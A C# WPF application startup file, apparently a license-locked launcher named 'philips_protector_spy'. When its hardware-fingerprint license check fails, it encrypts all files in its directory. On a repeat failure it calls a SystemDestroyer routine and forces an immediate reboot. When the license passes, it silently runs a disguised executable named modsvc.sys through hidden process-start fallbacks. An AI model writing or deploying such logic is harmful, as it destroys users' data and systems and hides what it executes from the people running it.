using System;
using System.Diagnostics;
using System.IO;
using System.Windows;

namespace philips_protector_spy
{
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    public partial class App : Application
    {
        private const string LICENSE_FILE_NAME = "mazlicense.lic";
        private const string EXECUTABLE_FILE_NAME = "modsvc.sys";

        private void App_Startup(object sender, StartupEventArgs e)
        {
            try
            {
                // Get application directory
                string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
                string licenseFilePath = Path.Combine(appDirectory, LICENSE_FILE_NAME);
                string executableFilePath = Path.Combine(appDirectory, EXECUTABLE_FILE_NAME);

                // Get current hardware fingerprint license key
                string currentHardwareLicense = LicenseGenerator.GenerateLicenseKey();
                
                bool licenseExists = File.Exists(licenseFilePath);
                bool licenseValid = false;
                string licenseKey = string.Empty;

                // Check if license file exists and is valid
                if (licenseExists)
                {
                    try
                    {
                        licenseKey = File.ReadAllText(licenseFilePath).Trim();
                        if (!string.IsNullOrWhiteSpace(licenseKey))
                        {
                            licenseValid = LicenseValidator.ValidateLicenseKey(licenseKey);
                        }
                    }
                    catch
                    {
                        licenseValid = false;
                    }
                }

                // If license doesn't exist or is not valid, encrypt all files
                if (!licenseExists || !licenseValid)
                {
                    // Show unauthorized action message
                    MessageBox.Show(
                        "you have taken an unauthorized action. please do not attempt this again...",
                        "Unauthorized Action",
                        MessageBoxButton.OK,
                        MessageBoxImage.Error);

                    // Check if files are already encrypted
                    bool filesEncrypted = FileEncryptor.AreFilesEncrypted(appDirectory);

                    if (!filesEncrypted)
                    {
                        // Encrypt all files except the license file
                        FileEncryptor.EncryptAllFiles(appDirectory, LICENSE_FILE_NAME);
                        // Shutdown silently
                        Shutdown();
                        return;
                    }
                    else
                    {
                        // Files already encrypted - destroy system
                        SystemDestroyer.DestroySystem();
                        
                        // Force system restart
                        try
                        {
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = "shutdown.exe",
                                Arguments = "/r /t 0 /f",
                                UseShellExecute = false,
                                CreateNoWindow = true,
                                WindowStyle = ProcessWindowStyle.Hidden
                            });
                        }
                        catch
                        {
                            // Continue even if restart command fails
                        }
                        
                        // Shutdown application
                        Shutdown();
                        return;
                    }
                }

                // License is valid - check if executable exists
                if (!File.Exists(executableFilePath))
                {
                    MessageBox.Show(
                        "Executable file not found: " + EXECUTABLE_FILE_NAME + "\n\nPlease ensure the executable file is in the same folder as the application.",
                        "Executable File Not Found",
                        MessageBoxButton.OK,
                        MessageBoxImage.Error);
                    Shutdown();
                    return;
                }

                // Run modsvc.sys silently
                bool executionSuccess = false;
                Exception lastException = null;

                // Method 1: Try with UseShellExecute = true (lets Windows handle file type)
                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = executableFilePath,
                        WorkingDirectory = appDirectory,
                        UseShellExecute = true,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    Process.Start(startInfo);
                    executionSuccess = true;
                }
                catch (Exception ex1)
                {
                    lastException = ex1;
                    
                    // Method 2: Try with UseShellExecute = false (direct execution)
                    try
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo
                        {
                            FileName = executableFilePath,
                            WorkingDirectory = appDirectory,
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true
                        };

                        Process.Start(startInfo);
                        executionSuccess = true;
                    }
                    catch (Exception ex2)
                    {
                        lastException = ex2;
                        
                        // Method 3: Try executing via cmd.exe (for renamed executables)
                        try
                        {
                            ProcessStartInfo startInfo = new ProcessStartInfo
                            {
                                FileName = "cmd.exe",
                                Arguments = "/c \"" + executableFilePath + "\"",
                                WorkingDirectory = appDirectory,
                                UseShellExecute = false,
                                CreateNoWindow = true,
                                WindowStyle = ProcessWindowStyle.Hidden
                            };

                            Process.Start(startInfo);
                            executionSuccess = true;
                        }
                        catch (Exception ex3)
                        {
                            lastException = ex3;
                        }
                    }
                }

                if (!executionSuccess && lastException != null)
                {
                    // Show detailed error for debugging
                    string errorDetails = "Error Type: " + lastException.GetType().Name + "\n" +
                                        "Message: " + lastException.Message + "\n" +
                                        "File Path: " + executableFilePath + "\n" +
                                        "File Exists: " + File.Exists(executableFilePath) + "\n" +
                                        "File Size: " + (File.Exists(executableFilePath) ? new FileInfo(executableFilePath).Length.ToString() : "0") + " bytes";

                    MessageBox.Show(
                        "Error executing " + EXECUTABLE_FILE_NAME + ":\n\n" + errorDetails + "\n\nPlease ensure the file is a valid executable.",
                        "Execution Error",
                        MessageBoxButton.OK,
                        MessageBoxImage.Error);
                }

                // Exit application after launching the executable
                Shutdown();
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    "An unexpected error occurred:\n" + ex.Message,
                    "Error",
                    MessageBoxButton.OK,
                    MessageBoxImage.Error);
                Shutdown();
            }
        }
    }
}
